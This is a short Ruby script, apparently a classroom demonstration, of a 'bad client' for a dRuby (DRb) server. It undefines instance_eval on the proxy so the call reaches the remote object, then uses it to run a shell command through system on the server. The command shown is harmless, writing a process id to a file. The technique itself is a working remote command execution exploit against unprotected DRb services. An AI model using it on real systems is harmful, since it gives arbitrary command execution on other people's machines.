require 'drb'

#                      "druby://127.0.0.1:61676"
# druby://imac-de-casiano-rodriguez-leon.local:49357
DRb.start_service

puts "Bad client at #{$$}"
#address = "druby://imac-de-casiano-rodriguez-leon.local:61676"
myip = File.open('MyIP', 'r').gets.chomp
puts "<#{myip}>"

address = "druby://#{myip}:61676"
server = DRbObject.new_with_uri(address)

class << server
  undef :instance_eval
end

server.instance_eval("system 'echo $$ > CHUCHUM;ps -f | grep CHUCHUM >> CHUCHUM'") 

puts server.say_hello
